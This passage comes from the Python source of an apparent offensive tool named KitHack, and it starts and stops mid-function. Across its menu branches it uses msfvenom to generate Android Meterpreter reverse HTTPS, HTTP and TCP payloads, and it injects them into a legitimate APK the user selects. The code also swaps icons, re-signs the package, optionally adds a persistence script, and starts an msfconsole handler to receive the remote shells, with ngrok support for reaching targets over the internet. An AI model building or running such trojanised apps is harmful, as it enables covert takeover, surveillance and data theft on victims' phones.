					print ('{0}[02]{1} Use the new KitHack method'.format(WHITE, YELLOW))

					m = input("{0}KitHack >> {1}".format(RED, DEFAULT))
					m = m.zfill(2)

					if m == '01':
						run_network()
						LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
						LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
						Tk().withdraw()
						APK = filedialog.askopenfilename(title = "KITHACK - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
						print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
						OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))
						mainout = os.path.splitext(OUT)[0]
						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
						print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))	
						time.sleep(4)
						os.system('systemctl start postgresql && msfvenom -x {0} -p android/meterpreter_reverse_https LHOST={1} LPORT={2} > output/{3}.apk'.format(APK, LHOST, LPORT, mainout))																				
						location = os.getcwd()
						if os.stat('output/{}.apk'.format(mainout)).st_size != 0:	
							while var.upper() != "N":
								print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
								time.sleep(4)				 								
								ext = mainout + '.apk'
								subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
								print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
								break							
							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
							if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
								os.system('systemctl stop postgresql && clear')
								main()	
							else:
								if not ".tcp.ngrok.io" in LHOST:
									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))
									pause("\n{}Press any key to continue...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter_reverse_http; exploit\'"')
									pause("\n{}Press any key to continue...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
						else:
							print("\n{0}[X] An error has occured whilst generating the backdoor\n".format(RED))
							time.sleep(3)
							pause("{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	

					elif m == '02':
						run_network()
						LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
						LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
						Tk().withdraw()
						APK = filedialog.askopenfilename(title = "KITHACK - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
						print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
						OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))
						mainout = os.path.splitext(OUT)[0]
						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
						print("\n{0}[*] Generating payload...{1}".format(GREEN, DEFAULT))	
						time.sleep(4)
						os.system('systemctl start postgresql && msfvenom -p android/meterpreter_reverse_http LPORT={0} LHOST={1} R > output/payload.apk'.format(LPORT, LHOST))
						location = os.getcwd()
						print("{0}[*] Decompiling original APK...{1}".format(GREEN, DEFAULT))						
						time.sleep(4)
						os.system('cp {0} {1}/output/original.apk && apktool d -f -o output/original output/original.apk'.format(APK, location))
						print("\n{0}[*] Decompiling payload APK...{1}".format(GREEN, DEFAULT))						
						time.sleep(4)
						os.system('apktool d -f -o output/payload output/payload.apk')
						print("\n{0}[*] Configuring RAT Payload...{1}".format(GREEN, DEFAULT))		
						time.sleep(4)				
						subprocess.Popen(['bash', '-c', '. lib/apkf.sh; rat'])
						print("\n{0}[*] Compiling RAT APK...{1}".format(GREEN, DEFAULT))		
						time.sleep(4)
						os.system('apktool b output/original -o output/kithack.apk')
						if os.path.isfile('output/kithack.apk'):
							print("\n{0}[*] Signing APK...{1}".format(GREEN, DEFAULT))	
							time.sleep(4)
							os.system('jarsigner -keystore certificate.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA output/kithack.apk android')	
							time.sleep(4)
							os.system('zipalign 4 output/kithack.apk output/{0}.apk'.format(mainout))
							while var.upper() != "N":
								print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
								time.sleep(4)				 								
								ext = mainout + '.apk'
								subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
								print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
								break							
							print("\n{0}[*] Deleting temporary files...{1}".format(GREEN, DEFAULT))
							time.sleep(4)
							os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/kithack.apk')
							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
							if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
								os.system('systemctl stop postgresql && clear')
								main()	
							else:
								if not ".tcp.ngrok.io" in LHOST:
									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))
									pause("\n{}Press any key to continue...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter_reverse_http; exploit\'"')
									pause("\n{}Press any key to continue...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
						else:
							print("\n{0}[X] An error has occured whilst generating the backdoor\n".format(RED))
							time.sleep(3)
							os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/kithack.apk')							
							pause("{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	

					else:
						print("\n{}[X] INVALID OPTION\n".format(RED))
						time.sleep(3)
						pause("{}Press any key to continue...".format(GREEN))
						os.system('clear')
						main()	

				else:
					print("\n{}[X] INVALID OPTION\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('clear')
					main()	


			elif pay == '02':
				print ('{0}\n [*] {1}Select APK Type:\n'.format(DEFAULT, GREEN))
				print ('{0}[01]{1} APK MSF'.format(WHITE, YELLOW))
				print ('{0}[02]{1} APK ORIGINAL'.format(WHITE, YELLOW))
				
				a = input("{0}KitHack >> {1}".format(RED, DEFAULT))
				a = a.zfill(2)
				
				if a == '01':
					run_network()
					LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
					LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
					while input("\n{0}[!] ¿Desea modificar el nombre/icono predeterminados? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":  
						break
					else:
						Tk().withdraw()
						icon = filedialog.askopenfilename(title = "KITHACK - SELECT ICON PNG",filetypes = (("png files","*.png"),("all files","*.*")))
						print("\n{0}ICON: {1}".format(YELLOW, icon))
						OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))						
						mainout = os.path.splitext(OUT)[0]
						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))	
						file = open("/tmp/data.txt", "w")
						file.write(icon + '\n')
						file.write(mainout)
						file.close()
						print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
						time.sleep(4)
						os.system('systemctl start postgresql && msfvenom -p android/meterpreter_reverse_https LHOST={0} LPORT={1} R > output/payload.apk'.format(LHOST, LPORT))																				
						print("{0}[*] Decompiling APK...{1}".format(GREEN, DEFAULT))
						time.sleep(4)						
						os.system('apktool d -f -o output/payload output/payload.apk')
						print("\n{0}[*] Configuring icon change...{1}".format(GREEN, DEFAULT))
						time.sleep(4)
						subprocess.Popen(['bash', '-c', '. lib/apkf.sh; icon']) 
						print("\n{0}[*] Compiling RAT APK...{1}".format(GREEN, DEFAULT))		
						time.sleep(4)
						os.system('apktool b output/payload -o output/kithack.apk')
						location = os.getcwd()
						if os.path.isfile('output/kithack.apk'):
							print("\n{0}[*] Signing APK...{1}".format(GREEN, DEFAULT))	
							time.sleep(4)
							os.system('jarsigner -keystore certificate.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA output/kithack.apk android')	
							time.sleep(4)
							os.system('zipalign 4 output/kithack.apk output/{0}.apk'.format(mainout))
							while var.upper() != "N":
								print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
								time.sleep(4)				 								
								ext = mainout + '.apk'
								subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
								print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
								break							
							print("\n{0}[*] Deleting temporary files...{1}".format(GREEN, DEFAULT))
							time.sleep(4)
							os.system('rm -rf output/payload output/payload.apk output/kithack.apk')
							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
							if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
								os.system('systemctl stop postgresql && clear')
								main()	
							else:
								if not ".tcp.ngrok.io" in LHOST:
									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))
									pause("\n{}Press any key to continue...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter_reverse_https; exploit\'"')
									pause("\n{}Press any key to continue...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
						else:
							print("\n{0}[X] An error has occured whilst generating the backdoor\n".format(RED))
							time.sleep(3)
							os.system('rm -rf output/payload output/payload.apk output/kithack.apk')							
							pause("{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()

					# Salida de bucle
					OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))											
					mainout = os.path.splitext(OUT)[0]
					var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
					print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
					time.sleep(4)
					os.system('systemctl start postgresql && msfvenom -p android/meterpreter_reverse_https LHOST={0} LPORT={1} R > output/{2}.apk'.format(LHOST, LPORT, mainout))																				
					location = os.getcwd()
					if os.stat('output/{}.apk'.format(mainout)).st_size != 0:
						while var.upper() != "N":
							print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
							time.sleep(4)				 								
							ext = mainout + '.apk'
							subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
							print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
							break						
						print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
						if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							if not ".tcp.ngrok.io" in LHOST:
								os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))
								pause("\n{}Press any key to continue...".format(GREEN))
								os.system('systemctl stop postgresql && clear')
								main()	
							else:
								os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter_reverse_https; exploit\'"')
								pause("\n{}Press any key to continue...".format(GREEN))
								os.system('systemctl stop postgresql && clear')
								main()	
					else:
						print("\n{0}[X] An error has occured whilst generating the backdoor\n".format(RED))
						time.sleep(3)
						pause("{}Press any key to continue...".format(GREEN))
						os.system('systemctl stop postgresql && clear')
						main()	
				
				elif a == '02':
					print ('{0}\n [*] {1}Select Method:\n'.format(DEFAULT, GREEN))
					print ('{0}[01]{1} Use the old Metasploit method'.format(WHITE, YELLOW))
					print ('{0}[02]{1} Use the new KitHack method'.format(WHITE, YELLOW))

					m = input("{0}KitHack >> {1}".format(RED, DEFAULT))
					m = m.zfill(2)

					if m == '01':					
						run_network()
						LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
						LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
						Tk().withdraw()
						APK = filedialog.askopenfilename(title = "KITHACK - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
						print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
						OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))
						mainout = os.path.splitext(OUT)[0]
						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
						print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))	
						time.sleep(4)
						os.system('systemctl start postgresql && msfvenom -x {0} -p android/meterpreter_reverse_https LHOST={1} LPORT={2} > output/{3}.apk'.format(APK, LHOST, LPORT, mainout))																				
						location = os.getcwd()
						if os.stat('output/{}.apk'.format(mainout)).st_size != 0:	
							while var.upper() != "N":
								print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
								time.sleep(4)				 								
								ext = mainout + '.apk'
								subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
								print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
								break							
							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
							if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
								os.system('systemctl stop postgresql && clear')
								main()	
							else:
								if not ".tcp.ngrok.io" in LHOST:
									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))
									pause("\n{}Press any key to continue...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter_reverse_https; exploit\'"')
									pause("\n{}Press any key to continue...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()							
						else:
							print("\n{0}[X] An error has occured whilst generating the backdoor\n".format(RED))
							time.sleep(3)
							pause("{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				
					elif m == '02':
						run_network()
						LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
						LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
						Tk().withdraw()
						APK = filedialog.askopenfilename(title = "KITHACK - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
						print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
						OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))
						mainout = os.path.splitext(OUT)[0]
						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
						print("\n{0}[*] Generating payload...{1}".format(GREEN, DEFAULT))	
						time.sleep(4)
						os.system('systemctl start postgresql && msfvenom -p android/meterpreter_reverse_https LPORT={0} LHOST={1} R > output/payload.apk'.format(LPORT, LHOST))
						location = os.getcwd()
						print("{0}[*] Decompiling original APK...{1}".format(GREEN, DEFAULT))						
						time.sleep(4)
						os.system('cp {0} {1}/output/original.apk && apktool d -f -o output/original output/original.apk'.format(APK, location))
						print("\n{0}[*] Decompiling payload APK...{1}".format(GREEN, DEFAULT))						
						time.sleep(4)
						os.system('apktool d -f -o output/payload output/payload.apk')
						print("\n{0}[*] Configuring RAT Payload...{1}".format(GREEN, DEFAULT))		
						time.sleep(4)				
						subprocess.Popen(['bash', '-c', '. lib/apkf.sh; rat'])
						print("\n{0}[*] Compiling RAT APK...{1}".format(GREEN, DEFAULT))		
						time.sleep(4)
						os.system('apktool b output/original -o output/kithack.apk')
						if os.path.isfile('output/kithack.apk'):							
							print("\n{0}[*] Signing APK...{1}".format(GREEN, DEFAULT))	
							time.sleep(4)
							os.system('jarsigner -keystore certificate.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA output/kithack.apk android')	
							time.sleep(4)
							os.system('zipalign 4 output/kithack.apk output/{0}.apk'.format(mainout))
							while var.upper() != "N":
								print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
								time.sleep(4)				 								
								ext = mainout + '.apk'
								subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
								print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
								break							
							print("\n{0}[*] Deleting temporary files...{1}".format(GREEN, DEFAULT))
							time.sleep(4)
							os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/kithack.apk')
							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
							if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
								os.system('systemctl stop postgresql && clear')
								main()	
							else:
								if not ".tcp.ngrok.io" in LHOST:
									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))
									pause("\n{}Press any key to continue...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter_reverse_https; exploit\'"')
									pause("\n{}Press any key to continue...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
						else:
							print("\n{0}[X] An error has occured whilst generating the backdoor\n".format(RED))
							time.sleep(3)
							os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/kithack.apk')							
							pause("{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	

					else:
						print("{}\n[X] INVALID OPTION\n".format(RED))
						time.sleep(3)
						pause("{}Press any key to continue...".format(GREEN))
						os.system('clear')
						main()	

				else:
					print("\n{}[X] INVALID OPTION\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('clear')
					main()	

			elif pay == '03':
				print ('{0}\n [*] {1}Select APK Type:\n'.format(DEFAULT, GREEN))
				print ('{0}[01]{1} APK MSF'.format(WHITE, YELLOW))
				print ('{0}[02]{1} APK ORIGINAL'.format(WHITE, YELLOW))
				
				a = input("{0}KitHack >> {1}".format(RED, DEFAULT))
				a = a.zfill(2)
				
				if a == '01':
					run_network()
					LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
					LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
					while input("\n{0}[!] ¿Desea modificar el nombre/icono predeterminados? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":  
						break
					else:
						Tk().withdraw()
						icon = filedialog.askopenfilename(title = "KITHACK - SELECT ICON PNG",filetypes = (("png files","*.png"),("all files","*.*")))
						print("\n{0}ICON: {1}".format(YELLOW, icon))						
						OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))						
						mainout = os.path.splitext(OUT)[0]
						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))	
						file = open("/tmp/data.txt", "w")
						file.write(icon + '\n')
						file.write(mainout)
						file.close()
						print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
						time.sleep(4)
						os.system('systemctl start postgresql && msfvenom -p android/meterpreter_reverse_tcp LHOST={0} LPORT={1} R > output/payload.apk'.format(LHOST, LPORT))																				
						print("{0}[*] Decompiling APK...{1}".format(GREEN, DEFAULT))
						time.sleep(4)						
						os.system('apktool d -f -o output/payload output/payload.apk')
						print("\n{0}[*] Configuring icon change...{1}".format(GREEN, DEFAULT))
						time.sleep(4)
						subprocess.Popen(['bash', '-c', '. lib/apkf.sh; icon']) 
						print("\n{0}[*] Compiling RAT APK...{1}".format(GREEN, DEFAULT))		
						time.sleep(4)
						os.system('apktool b output/payload -o output/kithack.apk')
						location = os.getcwd()
						if os.path.isfile('output/kithack.apk'):
							print("\n{0}[*] Signing APK...{1}".format(GREEN, DEFAULT))	
							time.sleep(4)
							os.system('jarsigner -keystore certificate.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA output/kithack.apk android')	
							time.sleep(4)
							os.system('zipalign 4 output/kithack.apk output/{0}.apk'.format(mainout))
							while var.upper() != "N":
								print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
								time.sleep(4)				 								
								ext = mainout + '.apk'
								subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
								print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
								break							
							print("\n{0}[*] Deleting temporary files...{1}".format(GREEN, DEFAULT))
							time.sleep(4)
							os.system('rm -rf output/payload output/payload.apk output/kithack.apk')
							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
							if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
								os.system('systemctl stop postgresql && clear')
								main()	
							else:
								if not ".tcp.ngrok.io" in LHOST:
									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
									pause("\n{}Press any key to continue...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter_reverse_tcp; exploit\'"')
									pause("\n{}Press any key to continue...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
						else:
							print("\n{0}[X] An error has occured whilst generating the backdoor\n".format(RED))
							time.sleep(3)
							os.system('rm -rf output/payload output/payload.apk output/kithack.apk')							
							pause("{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()

					# Salida de bucle
					OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))											
					mainout = os.path.splitext(OUT)[0]
					var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
					print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
					time.sleep(4)
					os.system('systemctl start postgresql && msfvenom -p android/meterpreter_reverse_tcp LHOST={0} LPORT={1} R > output/{2}.apk'.format(LHOST, LPORT, mainout))																				
					location = os.getcwd()
					if os.stat('output/{}.apk'.format(mainout)).st_size != 0:
						while var.upper() != "N":
							print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
							time.sleep(4)				 								
							ext = mainout + '.apk'
							subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
							print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
							break						
						print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
						if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							if not ".tcp.ngrok.io" in LHOST:
								os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
								pause("\n{}Press any key to continue...".format(GREEN))
								os.system('systemctl stop postgresql && clear')
								main()	
							else:
								os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter_reverse_tcp; exploit\'"')
								pause("\n{}Press any key to continue...".format(GREEN))
								os.system('systemctl stop postgresql && clear')
								main()	
					else:
						print("\n{0}[X] An error has occured whilst generating the backdoor\n".format(RED))
						time.sleep(3)
						pause("{}Press any key to continue...".format(GREEN))
						os.system('systemctl stop postgresql && clear')
						main()	
				
				elif a == '02':
					print ('{0}\n [*] {1}Select Method:\n'.format(DEFAULT, GREEN))
					print ('{0}[01]{1} Use the old Metasploit method'.format(WHITE, YELLOW))
					print ('{0}[02]{1} Use the new KitHack method'.format(WHITE, YELLOW))

					m = input("{0}KitHack >> {1}".format(RED, DEFAULT))
					m = m.zfill(2)
					
					if m == '01':
						run_network()
						LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
						LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
						Tk().withdraw()
						APK = filedialog.askopenfilename(title = "KITHACK - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
						print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
						OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))
						mainout = os.path.splitext(OUT)[0]
						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
						print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))	
						time.sleep(4)
						os.system('systemctl start postgresql && msfvenom -x {0} -p android/meterpreter_reverse_tcp LHOST={1} LPORT={2} > output/{3}.apk'.format(APK, LHOST, LPORT, mainout))																				
						location = os.getcwd()
						if os.stat('output/{}.apk'.format(mainout)).st_size != 0:
							while var.upper() != "N":
								print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
								time.sleep(4)				 								
								ext = mainout + '.apk'
								subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
								print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
								break							
							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
							if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
								os.system('systemctl stop postgresql && clear')
								main()	
							else:
								if not ".tcp.ngrok.io" in LHOST:
									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
									pause("\n{}Press any key to continue...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter_reverse_tcp; exploit\'"')
									pause("\n{}Press any key to continue...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
						else:
							print("\n{0}[X] An error has occured whilst generating the backdoor\n".format(RED))
							time.sleep(3)
							pause("{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	

					elif m == '02':
						run_network()
						LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
						LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
						Tk().withdraw()
						APK = filedialog.askopenfilename(title = "KITHACK - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
						print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
